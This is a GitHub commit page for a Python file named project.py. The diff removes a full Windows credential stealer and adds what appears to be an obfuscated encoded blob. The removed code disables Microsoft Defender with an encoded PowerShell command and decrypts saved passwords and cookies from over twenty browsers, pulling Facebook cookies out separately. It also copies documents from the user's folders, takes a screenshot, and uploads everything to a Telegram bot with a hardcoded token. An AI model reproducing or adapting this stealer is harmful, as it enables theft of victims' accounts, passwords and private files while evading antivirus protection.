Skip to content
vipmodz13
/
Bot13

Type / to search

Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
Settings
Commit
up
 main
ngobao123 committed 11 hours ago 
1 parent 2a685ff
commit 31006ed
Showing 1 changed file with 13 additions and 604 deletions.
 617 changes: 13 additions & 604 deletions617  
project.py
@@ -1,604 +1,13 @@



from Cryptodome.Cipher import AES
from PIL import ImageGrab
import os
import shutil
import sqlite3
import json
import base64
from Cryptodome.Cipher import AES
import win32crypt
import requests
from aiogram import Bot, types
import asyncio
import subprocess
import psutil, wmi
import locale
from datetime import datetime
from time import sleep
from pathlib import Path
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad
import pytz
import uuid
import os
import subprocess
import time

mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])


vn_tz = pytz.timezone('Asia/Ho_Chi_Minh')
# Lấy thời gian hiện tại của Việt Nam
current_time = datetime.now(vn_tz)

import asyncio
from aiogram import Bot, types


import browsercookie

key = b'\xd4\xaae\x19 \xdc\n\xa5~\xff\x8d>\\\x8e\xb7\xb4'
iv =  b'\xca4F\xca\xb2\xc0\x18\xa8\x11\x06\x08\xa3\x84\xa2\x9f\r'



def decrypt(cipher_text, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_text = unpad(cipher.decrypt(cipher_text), AES.block_size)
    return decrypted_text.decode('utf-8')


cipher_texttoken = b'\xe9\xf4H@\xee?k\x1cX?GY&m,@\xe2\x10\x13n\x02\x82-\xdf\xec\xc2$\xf9\xa4\x93\xc2\xf4s\xae\x9c\x96\xa8\xadA\x80Ks>\xfb\x08\xa2\x90k'
cipher_textids = b'\xe7\xa8D\xb2\xe2\xe6\x05}\xcd\x89\x1e\xfer\xd6\xf4M'
decrypted_texttoken = decrypt(cipher_texttoken, key, iv)
decrypted_textid = decrypt(cipher_textids, key, iv)

# print(decrypted_texttoken)
# exit()

#####################################################################

# Thông tin bot
idbot = '-4000526341'
token = '6792955926:AAH2xjWsMpzZ91kK3-jUQH5_QpHonMOLU_U'
bot = Bot(token=token)

#####################################################################


exe = 'BASE64_ENCODED_EXE'
grabfiles = 0
passwd = 0
cookies = 0
path_data = 'C:\\Users\\Public\\Document1'
try:os.mkdir(path_data)
except:pass
try:os.mkdir(path_data+'\\Cookie')
except:pass
try:os.mkdir(path_data+'\\Password')
except:pass
try:os.mkdir(path_data+'\\Log')
except:pass
try:os.mkdir(path_data+'\\GrabFiles')
except:pass
try:os.mkdir(path_data+'\\CookieFacebook')
except:pass
def get_antivirus_info():
    try:
        c = wmi.WMI()
        antivirus_products = []

        query = "SELECT * FROM AntiVirusProduct"
        for product in c.query(query):
            antivirus_products.append(product.displayName)

        if antivirus_products:
            return ", ".join(antivirus_products)
        else:
            return "N/A"
    except Exception as e:
        # print("Error fetching antivirus information:", e)
        return "N/A"


def end_chrome():
    for proc in os.popen('tasklist').readlines():
        if 'chrome.exe' in proc:
            subprocess.run('taskkill /f /im chrome.exe', shell=True)

def find_profile(data_path):
    profile=[]    
    profile.append('Default')
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if(text[0] == 'Profile'):
                profile.append(folder)
        return profile
    except:pass
def screenshot():
    screenshot = ImageGrab.grab()

    screenshot_path = os.path.join(path_data, "screen.png")

    screenshot.save(screenshot_path, "PNG")
def pcinfo():
    try:
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
    except Exception as e:
        #print("Error fetching computer OS:", e)
        computer_os = None

    try:
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    except Exception as e:
        #print("Error fetching CPU information:", e)
        cpu = None

    try:
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    except Exception as e:
        #print("Error fetching GPU information:", e)
        gpu = None

    try:
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                     shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
    except Exception as e:
        #print("Error fetching RAM information:", e)
        ram = None

    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")

    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except Exception as e:
        #print("Error fetching hardware UUID:", e)
        hwid = None

    try:
        ip = requests.get('https://api.ipify.org').text
    except Exception as e:
        #print("Error fetching IP address:", e)
        ip = None

    try:
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address
    except Exception as e:
        #print("Error fetching MAC address:", e)
        interface = None
        mac = None

    try:
        system_locale, _ = locale.getlocale()
        language = system_locale if system_locale else "en-US"
    except Exception as e:
        #print("Error fetching system locale:", e)
        language = None

    antivirus = get_antivirus_info()

    return computer_os, cpu, gpu, ram, username, hostname, hwid, ip, interface, mac, language, antivirus
def get_country(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        data = response.json()
        country = data.get("country", "N/A")
        return country
    except Exception as e:
        #print("Error fetching country information:", e)
        return "N/A"
def browser():
    a = [
        {
            'name': 'Google',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"))
        },
        {
            'name': 'CocCoc',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"))
        },
        {
            'name': 'Edge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Chromium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"))
        },
        {
            'name': 'Amigo',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"))
        },
        {
            'name': 'Torch',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"))
        },
        {
            'name': 'Kometa',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"))
        },
        {
            'name': 'Orbitum',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"))
        },
        {
            'name': 'CentBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"))
        },
        {
            'name': '7Star',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"))
        },
        {
            'name': 'Sputnik',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"))
        },
        {
            'name': 'Vivaldi',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"))
        },
        {
            'name': 'GoogleChromeSxS',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"))
        },
        {
            'name': 'EpicPrivacyBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"))
        },
        {
            'name': 'MicrosoftEdge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Uran',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"))
        },
        {
            'name': 'Yandex',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Iridium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"))
        },
        {
            'name': 'Opera',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"))
        },
        {
            'name': 'OperaGX',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"))
        },
    ]

    return a
def getSecretKey(path1):
    try:
        path = os.path.normpath(path1 + "\\Local State")
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        pass
#Decrypt
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)
def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        pass
def start1():
    bc = browser()
    cookie = []
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ))
                        cookie.append({'path':os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass
        else:
            pass
    return cookie
def start2():
    bc = browser()
    password = []
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile ))
                        password.append({'path':os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass            
        else:
            pass
    return password



def extract():
    global cookies, passwd
    screenshot()
    grab_files()
    datacookie = start1()

    # cookie_fb = ''

    for row in datacookie:   
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc FROM cookies'
        cursor.execute(select_statement)
        bc = cursor.fetchall()
        # print(bc)

        cookie_fb_item = ''        


        data1 = []
        for user in bc:
            if user[4] == 1 : httponly = "TRUE"
            else:httponly = "FALSE"
            if user[5] == 1 : secure = "TRUE"
            else:secure = "FALSE"
            value = decryptPassword(user[3], getSecretKey(row['pathkey']))

            if 'facebook' in user[0]:
                cookie_fb_item +=  user[1] + '=' + value  + ';'

            cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"  
            data1.append(cookie)
            cookies +=1


        with open(os.path.join(path_data,'Cookie',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            for line in data1:
                f.write(line)


        with open(os.path.join(path_data,'CookieFacebook',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            f.write(cookie_fb_item)




    datapassword = start2()

    for row in datapassword:
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT action_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        data2 = []
        for userdatacombo in login_data:
            if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "" and userdatacombo[0] != "":
                password = decryptPassword(userdatacombo[2], getSecretKey(row['pathkey']))
                data = "**************************************************\nURL: " + userdatacombo[0] + " \nUsername: " + userdatacombo[1] + " \nPassword: " + str(password)
                data2.append(data)
                passwd +=1
            else:
                pass
        with open(os.path.join(path_data,'Password',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            for line in data2:
                f.write(line + "\n")
def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
    subprocess.run(cmd, shell=True, capture_output=True)
def openexe(encoded_content):
    decoded_content = base64.b64decode(encoded_content)
    print(decoded_content)
    exit()
    with open('C:\\Users\\Public\\setup.exe', 'wb') as file:
        file.write(decoded_content)
    os.startfile('C:\\Users\\Public\\setup.exe')

class CustomInputFile(types.InputFile):
    async def read(self, bot):
        with open(self.file_path, 'rb') as f:
            return f.read()

def upload_file(FILE_PATH, UPLOAD_URL):

    if os.path.exists(FILE_PATH):
        print("File exists")
    else:
        print("File does not exist")

    files = {'file': open(FILE_PATH, 'rb')}
    print(files)
    response = requests.post(UPLOAD_URL, files=files)

    print(response)

    if response.status_code == 200:
        print('File uploaded successfully!')
    else:
        print('File upload failed.')


async def sendfile(TOKEN, ID, z_ph, caption1):

    file_path = r'C:/Users/Public/Document2/CookieFacebook/All.txt'  # Đường dẫn tới tệp tin cần gửi
    with open(z_ph, 'rb') as file:
        await bot.send_document(chat_id=ID, document=file, caption=caption1)


    # print(TOKEN)
    # print(ID)
    # print(path)
    # print(caption1)
    # exit()

    # path_cookie_fb = path_data  + '/CookieFacebook/All.txt'
    # path = Path(path_cookie_fb)
    # path_cookie_fb = str(path).replace("\\", "/")
    # print(path_cookie_fb)


    # try:


        # path = Path(z_ph)
        # # Thay thế ký tự "\" thành "/"
        # z_ph = str(path).replace("\\", "/")

        # print(z_ph)

        # FILE_PATH = z_ph
        # UPLOAD_URL = 'https://wsv.asia/upload/main.php'

        # upload_file(FILE_PATH, UPLOAD_URL)


        # exit()








name_f = ""
def grab_files():
    global grabfiles
    file_extensions = ['.txt', '.docx']
    source_folders = [
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Pictures")
    ]

    max_file_size = 500 * 1024 

    for source_folder in source_folders:
        if os.path.exists(source_folder):
            for root, _, files in os.walk(source_folder):
                for file in files:
                    _, extension = os.path.splitext(file)
                    if extension in file_extensions:
                        source_path = os.path.join(root, file)
                        if os.path.getsize(source_path) <= max_file_size:
                            destination_path = os.path.join(path_data, 'GrabFiles', file)
                            shutil.copy(source_path, destination_path)
                            grabfiles +=1
                            #print(f"Copied {file}")
                        else:
                            continue
                            #print(f"File {file} exceeds size limit. Not copying.")
        else:
            continue
            #print(f"Source folder not found: {source_folder}")


async def main(TOKEN, ID):
    # try:
    #     openexe(exe)
    # except:pass
    disable_defender()
    computer_os, cpu, gpu, ram, username, hostname, hwid, ip, interface, mac, language, antivirus = pcinfo()
    country = get_country(ip)



    end_chrome()

    extract()


    # Nhấn Ctrl + Shift + T để mở lại các tab đóng lần cuối
    #open chrome
    subprocess.run('start chrome --restore-last-session', shell=True)



    t = datetime.now(vn_tz).strftime('%d_%m_%Y_%H_%M')
    name_f = f'Databot_{username}_{mac_address}_{country}'
    name_f = name_f.replace(':', '_')

    z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
    caption = f"       ==========\n⏰ Date => {datetime.now(vn_tz).strftime('%d/%m/%Y %H:%M')}\n💻System => {computer_os}\n👤 User => {username}\n🆔 PC => {hostname}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n🔍 Mac => {mac}\n⚙ Ram => {ram}\n⚙ Cpu => {cpu}\n⚙ Gpu => {gpu}\n📝 Language => {language}\n🔓 Antivirus => {antivirus}\n ====[ User Data ]====\n📂 FileGrabber => {grabfiles}\n ====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"

    await sendfile(TOKEN, ID, z_ph, caption)

    shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)

    # try:
    #    shutil.rmtree(path_data)

    # except:
    #     try:cd
    #         os.system(f"rmdir {path_data}")
    #     except:
    #         pass




# Cảnh báo khi chạy =))))
if __name__ == '__main__':
    asyncio.run(main(token, idbot))
    try:
        shutil.rmtree(os.path.join(os.environ["TEMP"], name_f))
    except Exception as e:
        pass




#pip install pycryptodome  , It works only v3.11 Above.
import random ,base64,codecs,zlib;pyobfuscate=""

obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decode())'],['''CX7Im=X;K(*~$zFL-i2cpRpY`@=`Gb0<|uG^a`O9-gm$9UGB@*lS_!WHm@JxMY+16ZT*V1Qf65m*F@oT354ad&fZfkinQy@=^i?cswy*SN5QYV_RPBcuCAFwejq~I2>Nv2StWk|GQ2f_xMCT!gpw^ap`!;<+ZndvQUu`@nkr^Eo2*`Uue+?BV~~6@=g8A9vq*Sdtj>Eh_e-Q-;AodA7}VWNw7}+49TN?p)mOJ6-#VRpO)Rd}YKJj4$(#cXK=*LKvX9hJ!IL#rUbnxqU)lHJhK-Pun2!W=ku7^_B7M$XREIJYIr3`HRqvgKMS#s~+iq_VFdQJkd(=i3Gb)<-;L;&H@_J3WKxV7`4r<KJP3WoxV)HEcjM!ZOnjx^*R`rd<;6Lzp3n>K!j0Y2zf&pnaqtDQ9g=0|i^3a+X_2+2yKO3BT<G)Ki{Y=561AO=;$>I^XE|Nh`13TXUWD)cl+$dZIki*+nG491qz;eU;pWxGDS<WjP4{1z1!JI)qE&|-ZkdRO5B}n1L?84zgQCP(5stYHJ%_R4*j&jtX7uq9~lm>BkP(TNi;zVT$pMF~hFvV%Nlpw8!;8@l^|L0|hL~JH`e=A5TURI7rRC$i17DU{Wqu?QAly(b##Twa%z1d9W^y1OXckCh{IiDAZ54uNn!+p-kddmu%7tVgJqjhsvAJ})xn(+l;CGfMjriF+lwG3stdM00?n+sUdgc}l}bipx9{z#>dj6Pa72$y0bl}K~Rb#1LnD*WPE0u#+jJC&hSeKx4&CkF2Mn)Q~W<M>;537f7siqounMpC1FlJvcrWgHHv;xrq25t}GndPcK3O_4C62e~K6i0$jt3$`}R=q=E~SX?XXejZc5)wxO?$v-a>iIjMi3IkI~9$AAsgt^9M7I09w{eJ0Ftf~8J=MR-0o=_uzF=Ac3!rFN1fuvF0x;v8US=SIy?{NYX7Ld~q#L1iH;FN**v(Bs@L8Vx6|6m2k_87ET6K(<UX`1!5Y2X$15&ec`#2Bp*&TGL0_2E90lY7_4q$KDLG@%;0Nn5|O)8v74gKYFJf_Mf#QRHLffq8=cTQ{O{J%NBJcl*ddIhf?y25jVySj5U%gWj22+5qVwcdcVB!s_EwKH{_?OMkw6h(VTEkB~g?e33!F26p~Nz@~o!EZ8egvoyW#TJ?*ULW}h)J1D%KKj?r2_lzmfwzUhf;VX|w>61$8z}9d$9-n1v;cwyb**cx|4{>Vmz#fdhv^4AUUF2B7(+PSB|B+1e=Chl&KiAvz#M&Td2;_l)qUul`;sQSNr1L*h3(igOHT1gMFm(`&W&?KWn`tMMBuocFoRMRB7a$ko%*aN7j5?%X*sSdGD6ET6TRCarKdF8ITTj1bt!;6ah38f_n};x#Y9a(t)kB9!{r=VeN6njQl|!^9?z7hW0;cv!H}%`%t$~NLNPvzEHT<_!K$ujrkJ4Ru_>(EQ$Bx^yeJXTbS6~Ti^yn;QS^vAmkmmCjGa_UZn?B9p)@1p!jfX5VDyT@))GWHK-DemJTBok@I#oR!9WYUkxVOb~)mzWSSXS?M>$NBrAbIw&+rrqw9wi`3_-qz{KxWe+>guK%G!HKz>Qj$W%cf{O=MA5+<<D~SulLi1g&#E(M{i!Hg*u%XYk|CmqN@_;Ia0U4s(ze*4h690Y^E59YaGb_$}?3o3(>bfay;tN)Hd=tDG^ddm2KD5g*e|{LR@+@xMEgX&_sA2l>PPQ%GCb==yt8eEyLL2*Ta>nG)XU+$F8yFN*@pPWgw%BixW5$@?O%2=xKD2JIl0Do|`@Xm#-hLCnHEMq2h50J7q`CX}H!kw=`Dj@_^cdRFir}^&8%<&yny67rnMH&}~Q<w)*vOHXT<k1}J<sdEN;szp7OdG{dKy-9iE!bfn!&sQ)Pbh<g-25_spQu@g;s#d(20ztFpF?UPo}Yq<_X-|U;hb(l-N#V<SUO(;dtE$9P~I&;5R*8{WGc?=F1p&JfTCVlQx9dj7tWKxbm3H~*dQ1DkTatV*YYd_XGPp@LmE7vC<qCVe>Jr~W<YB=SyjHx(4h;7i=nNU;4Q$DVI*1`r}n!8Op@nv`mDk$D~v!wE0iUd-BGFBDly@6o-Q>G!I-7ZTAg8OPD<w0*s;wK7!Gv3O#R0KA{=Kbg>*m<bmk@jSAk_d?Vkf?}g&978c3n2(@EiauQmS^MJ5he}~SNNP}WF{vNQqX@JDU}jJ4v=%pVWKX5UU|um7jrYMg8>7HKVp&15=<U6F8b8a*lBy?5yOhz9GB!~P}Nhg5k5D7I?TeG-*88?%_ZJqDXICCoEOS8Z($(1dRifo*$dt_5N@Eqc#9294Z)ldZsn>IWsENwKj-*tH>7sA-E<xptoK#rc<yko5Ml6iK+KK*s$rKR=^aL=U*uF^qabOg8EJR^Vat^8Hl=Ws88$kR{eqh+GN;(HqKi1}dW=}8Nu#!|d-pWQc+m+}>Num!CVE*Yk*Tzyj4<bkBZBL5ZN52dyc!jtV`E~$>=viD&?>R^v8T@GFs~|G?(?4JJmPu~xx`Dt*ndM-r+_|*L$F_+b3*DZ+@1bb#VF2oXF_AGgpXiM8CSV<E_HpCI}{5gmo$AdyMWm-Ry3IAP}K8YiMqH`ZslTdd6(nI?bN|{T+AbLQc9|VhB|_W+?bIecd-(%oZo_aSwlG84wl>qcuBh84Pgjx(0=@$78^|#ZXsQyes*$9z`8hcv~dYN!j~;6Lv53|yMQ@m=YAN)J%s)>M;R2QMlz;;TT+Tr!omqD2&U!|AujP?VtHrf*95Z(PXxlt#L=G7HsNoA>2A))wsFG$U<CDP9W1J(i%&x;@&wMV{<H5U!VAi46<uRc(@PKbqK6Mi3|t>)@tzZJ`p(B&dSGMK-dro&FpGEv&JM8j&XRQ4xUmr=KbP_0Xm%{*CB9y*ji{d^?>@7_k!aP@`spdz{KssvEV{SoIT+)Wrq60zCa@kCBXP6OP)t)qmW@)$){2alTtB^bj4IzeUMRsF@Q^XLowD%cR5A`#BlJ%#3?X(4ZaI5}K91V-JG-M#M+c#V)KHU$tJa<0;(Izb%K(s28*t2REK&{4!{Ro>g~k_oXOutUCrvDN&#Yt72z-j|+C*sIUH4bciK1j^lL~y1)A_RLTZyI1a*gd`wiv;e#rJ{jjCr{1&^kS`_i@h1QRvq|rkU{$y!h1*8)F?%R~?y;jlRY7k5WB;fqy=PUXfxaatd8%_Tb_+LN7@!Bo|$^s8q2ehmRG1zBYG$4xGEqRxc6wutPUH2{~TobSogrld;)1GlPJ@AGvd(ho{{FA9&pQE&lO~>t%jfc<Q;o>iqx#tuq-|lACmeHU<S|*{+(cSGIqn2=N0nIWQ9CWVIy`=UZV1qnr**Kr6*NxIm31i%@4FTucq8s4O^GzJp%=>R4;xug^kBhBCS`R~~s)^S-uV1h;6dKbPwzblO{38^MOjL2><86Ja{!4dSb&d|d7_1&l%hyMxzY?!TO>^(`wIPmh*_(3ROoWi(g|k$IlE6AepEjv~6$DLO#+y>a$W_Bwm3CX*@|gcr6Wgb1CmktaU<*mVLMZC-Caf&A(7mxoUoQ#DhhhImZ0i`<YhUt$ox1%-Sn#0XX$ER@d`MbOsmeK-M&$>{A$*Sp5dX<wb9+Y9r95YVm28VcIZldrTYG-+%R>6ZcRq<?G4!eRBDANDl3c2?3iF?iTsO0{KE{TS}%PjN4;giVX5<x`Ju57K3DrH##JhphJjm-Zd<jbP$VZ22p`VXZdTd!i`%z}{iW{ov90EmhZPG0O*vfP?veO2j@7Z(~j~irqDg?Uk>0ZyZjP42w^(LZ0*r+|}?}U=nU9)XF;9WoR{uu|3Ao$|ypm*5eP97s*bEEa}BSj4IVg7QR6!i?6}K2h!D8KXOCxh{>Ew{LOq|$2PjvsLn+7*xevF;x@Tz)aUD>*rRfOV^`-j8+hBW(d_M>vd@0{n+}k+O0xt6W4W{J1`m5L=wB)qfiJt2w2_F4Ykq{G^yDM4siy5AI)!DRhi5MUc51@-Z7h0(kPoGk)@C9v)=m&n&sTZSdF5qd$ilyhan>GK{C&<(N#e7<7WWD>Pbx|Bzc9yRy#{iK5~SWzDnmHsh+@FY0%6Asyg;Eojb(dZPNgW2nowCuFX12y)s~`mzV|%%QY36sRD!SJ!a%y>*VThUR#-dNDhX}PVNeG+H;(e+rMlJ)4t10gA5bUxa@lTBNIxrv6DlRkYW&WDEXGSNKPckqh$V;KOrX;E<IHnNgt@ep+iWfU8)ywxkvaTxm|e2;8_f+78l0Rr3J+Dp&n9Us4*-g1Vo0fMll6)!)IRB4=O&`2EVa)8_O<pwMC=f*_v|(=IPeHQZxF*s*P+~Z<V`YDSJGWQi>BPDtQ+_P389?e3;ZhAv9x3#>!}OgwA?*Af^P)%$q{d??lGZ6f3-gdg!&@!dH-HM+x13vhS(b3+Ss17qG3$T!eqc{(iOR}CYQWxlID)$=tQTpgp~I;&mxm1m|oNphhJVO|A%U%ea{!M#uILFWt4pNwIyycv#~OjJi3<?hYd6o(6+F_cWTnnsSF-#M{+&VTUh;!`ieH{L86KH#KX%=d@VRC6sL@rt^LehRV0K8KD&PdHCz)^V{YunN>v>-4()BD-a4h1qWhKkp{O~E$ArO{^&$I{Cnl)4^+CmsK9yUrk}97nA8Ss+!fk+7Ttc|QS7VDc@C$%ixE&gnW^H}OI`V_6?2p^`2{KvUmbYb$6N2>4{kkTWQnP51Nt%wJij!!j+Xeo$%1FK_@@v$oaH4P2J}+xVwi2L4-3PXOiKaFm3#vrVWu4lI*?d=;k9d}+Ft{tt+_kEM2M}QL4s7g9q)kb<5oDiIHLcVBVNwwW->kM`>JGZ>-qS55NU)>g0Bov^&w1}`hiivaU@a4ju3qL09<E^e`f{;-eO||MZvBVH6@W68>kZTrUbKM%5R42iK=ZWno<*L)0yl4ikG%f(l^m=WPMrl7;aoM&VZ6)Fl}_UNbzgiMZ_b5;lYXIs=hpR^3W0}%W_AQC-
